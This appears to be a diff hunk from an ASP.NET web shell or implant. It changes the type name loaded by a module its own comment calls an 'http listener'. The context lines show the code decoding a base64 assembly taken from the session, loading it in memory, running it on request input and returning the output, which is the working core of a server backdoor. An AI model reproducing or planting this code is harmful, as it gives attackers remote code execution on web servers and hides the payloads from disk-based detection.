@@ -35,7 +35,7 @@
             if(!string.IsNullOrEmpty(http) && Session["data_pl"] != null){ // http listener
                 //Response.Write(http);
                 Assembly assembly = Assembly.Load(Convert.FromBase64String(Session["data_pl"].ToString()));
-                Type type = assembly.GetType("SystemIIS.HTTP");
+                Type type = assembly.GetType("SystemIIS.HTTPListener");
                 string result = (string)type.GetMethod("GetResult").Invoke(type.GetConstructor(new Type[] { typeof(string) }).Invoke(new object[] { http }), null);
                 Response.Write(result);
                 Session.Remove("data_pl");
